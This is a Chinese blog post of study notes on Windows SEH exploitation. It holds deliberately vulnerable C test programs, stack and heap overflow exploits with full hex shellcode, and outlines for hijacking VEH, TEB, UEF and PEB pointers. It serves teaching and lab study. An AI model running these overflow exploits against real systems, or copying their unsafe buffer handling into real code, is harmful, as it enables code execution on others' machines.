---
title: windows 异常处理中的漏洞利用
date: 2017-06-29 20:21:31
categories: 安全技术
tags: windows
---

### 1. S.E.H概述

SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。

几个要点：
1. SEH结构体放在系统栈中
2. 当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理
3. 如果程序源代码中使用__try{}__except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SEH来实现异常处理
4. 栈中一般会同时存在多个SEH
5. 栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB(线程环境块)0字节偏移处的指针标识
6. 当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。
7. 当离“事故现场”最近的异常处理函数运行失效时，将顺着SEH链表依次尝试其他的异常处理函数
8. 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通过这个函数弹出一个对话框，然后强制关闭程序。

![SEH原理图](/images/2017-06-28/seh.jpg)

利用SEH的原理：
1. SEH放在栈内，可以缓冲区淹没SEH
2. 精心制造溢出数据可以把SEH中异常处理函数的入口地址更改为shellcode的起始地址
3. 溢出后错误的栈帧或堆块数据往往会触发异常
4. 在Windows开始处理溢出的异常时，会错误地把shellcode当作异常处理函数而执行

### 2. 栈溢出中利用SEH

#### 2.1 获取shellcode起始地址和SEH地址

测试代码
<pre><code>
#include <windows.h>
#include <stdio.h>

char shellcode[] = "\x90\x90\x90\x90";


DWORD MyExceptionhandler(void)
{
	printf("got an exception,  press Enter to kill process!\n");
	getchar();
	ExitProcess(1);
	return 1;
}

void test(char *input)
{
	char buf[200];
	int zero = 0;
	__asm int 3;		// used to break process for debug
	__try
	{
		strcpy(buf, input);  // overrun the stack
		zero = 4/zero;		// generate an exception
	}
	__except(MyExceptionhandler()){}
}

void main()
{
	test(shellcode);
}
</code></pre>

<b>根据Ollydbg得到结论</b>

<font color=#f00>shellcode起始位置为0x0012FE48
离栈顶栈顶最近的SEH链表指针地址为0x0012FF18，其异常处理函数句柄地址为0x0012FF1C
shellcode起始地址与异常处理句柄地址之间共有212个字节间隙，也就是说，超出缓冲区8字节后的部分将覆盖SEH链的第一个SEH：由于SEH链表指针为0x90909090，所以为无效地址，系统为默认其为最终的异常处理；而而处理函数句柄内的地址是shellcode起始地址，那么就会跳转至此进行函数执行。</font>

#### 2.2 编写shellcode

<pre><code>
char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
	"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
	"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
	"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
	"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
	"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
	"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
	"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
	"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
	"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
	"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x48\xFE\x12\x00";

</code></pre>

注意在执行的时候去掉__asm int 3调试

### 3. 堆溢出中利用SEH

<pre><code>
#include &lt;windows.h&gt;

char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
	"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
	"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
	"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
	"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
	"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
	"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
	"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
	"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
	"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
	"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x16\x01\x1A\x00\x00\x10\x00\x00"	// heap of the ajacent free block(尾块)
	"\x88\x06\x36\x00"		//0x00360688 is the address of shellcode in first Heapblock
	"\x90\x90\x90\x90";		//target of DWORD SHOOT

DWORD MyExceptionhandler(void)
{
	ExitProcess(1);
	return 0;
}

int main()
{
	HLOCAL h1=0, h2=0;
	HANDLE hp;
	hp = HeapCreate(0, 0x1000, 0x10000);
	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
	memcpy(h1, shellcode, 0x200);	// overflow here
									// noticed 0x200 means 512
	__asm int 3				// used to break the process
	__try
	{
		h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
	}
	__except(MyExceptionhandler()){}
	return 0;
}

</code></pre>

实验方案：
1. 溢出第一个堆块的数据将写入后面的空闲堆块，第二次分配的时候发生DWORD SHOOT。
2. 将SEH的异常回调函数地址作为DWORD SHOOT目标，将其替换为shellcode入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。

得到的DWORD的目标地址后，就可以去掉中断指令，更改DWORD SHOOT的目标地址，重新执行

<font color=#f00>遗憾的是，该实验我做了很多次，最后都是无功而返，没有试验现象，到目前为止不知道原因！！！！</font>

### 4. Windows异常处理

#### 4.1 不同级别的SEH

异常处理流程：
* 首先执行线程中距离栈顶最近的SEH异常处理函数
* 若失败，则依次尝试执行SEH链表中的后续异常处理函数
* 若SEH链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理
* 若仍然失败，系统默认的异常处理函数将被调用，程序崩溃窗口将被弹出

#### 4.2 线程的异常处理

线程中用于处理异常的回调函数有4参数：
1. pExcept：指向非常重要的结构体EXCEPTION_RECORD。该结构体包含若干与异常相关的信息，如异常的类型、异常发生的地址等
2. pFrame：指向栈帧中SEH结构体
3. pContext：指向Context结构体。该结构体中包含所有寄存器的状态
4. pDispatch：位置用途

返回值：
0（ExceptionContinueExecution）：异常被成功处理，将返回原程序发生异常的地方，继续执行后续指令。
1（ExceptionContinueSearch）：代表异常处理失败，将顺着SEH链表搜索其他可用于异常处理的函数并尝试处理。

![unwind处理过程](/images/2017-06-28/unwind.jpg)

异常处理函数的第一轮调用用来尝试处理异常，而第二轮的unwind调用时，往往执行的是释放资源等操作。

#### 4.3 进程的异常处理

如果异常没被线程的异常处理函数或调试器处理掉，将交给进程中的异常处理函数。

通过API函数SetUnhandledExceptionFilter来注册，其是kernel32.dll的导出函数。

<font color#f00>提示：把线程异常处理对应代码中__try{}__except(){}或者Assert等语句，把进程的异常处理对应于函数SetUnhandledExceptionFilter</font>

返回值：
* 1(EXCEPTION_EXECUTE_HANDLER):表示错误得到正确的处理，程序将退出
* 0(EXCEPTION_CONTINUE_SEARCH):无法处理错误，将错误转交给系统默认的异常处理
* -1(EXCEPTION_CONTINUE_EXECUTION):表示错误得到正确处理，并将继续执行下去。类似于线程的异常处理函数，系统会用回调函数会付出异常发生时的断点状况。但这时引起异常的寄存器应该已经得到了恢复。

#### 4.4 系统默认异常处理UEF

如果进程异常处理失败或用户根本没有注册进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用。

#### 4.5 异常处理流程总结

* CPU执行发生并捕获异常，内核结果进程的控制权，开始内核态的异常处理
* 内核异常处理结束，将控制权还给ring3
* ring3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher()函数
* KiUserExceptionDispatcher()首先会检查程序是否处于调试状态。如果程序正被调试，会将异常交给调试器进行处理
* 在非调试状态下，KiUserExceptionDispatcher()调用RtlDispatchException()函数对线程的SEH链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，以保证异常处理机制自身的完整性
* 如果栈中所有的SEH都失败了，且用户曾经使用过SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用。
* 如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理UnhandledExceptionFilter()将被调用。UEF会根据注册表里的相关信息决定是默默关闭程序，还是弹出错误对话框

### 5. 其他异常处理机制的利用思路

#### 5.1 VEH利用

VEH（Vectored Exception Handler，向量化异常处理）
1. VEH和进程异常处理类似，都是基于进程的，而且需要使用API注册回调函数
2. 可注册多个VEH。VEH结构体之间串成双向链表，因此比SEH多了一个前向指针
3. VEH处理优先级次于调试器处理，高于SEH处理。先KiUserExceptionDispatcher，再VEH，最后SEH
4. VEH保存在堆中
5. unwind操作只对栈帧中的SEH链起作用，不会涉及VEH这种进程类的异常处理

[Windows heap overfows](/others/2017-06-28/bh-win-04-litchfield.ppt)
如果能利用堆溢出的DWORD SHOOT修改VEH头结点指针，在异常处理开始后，并能引导程序去执行shellcode

#### 5.2 攻击TEB中的SEH头节点

异常发生时，异常处理机制会遍历SEH链表中寻找合适的出错函数。线程SEH链通过TEB的第一个DWORD标识(fs:0)，这个指针永远指向离栈顶最近的那个SEH。如果能够修改TEB中的这个指针，在异常发生时就能将程序引导到shellcode中去执行

[Third Generation Exploition](/images/2017-06-28/halvarflake-winsec02.ppt)

#### 5.3 攻击UEF

如果能通过DWORD SHOOT把这个处理函数覆盖为shellcode的入口地址，再制造一个其他异常处理无法解决的异常，那么系统将使用UEF作为最后一根救命稻草来解决异常时，shellcode就被执行。

#### 5.4 攻击PEB中的函数指针

前面博客有讲

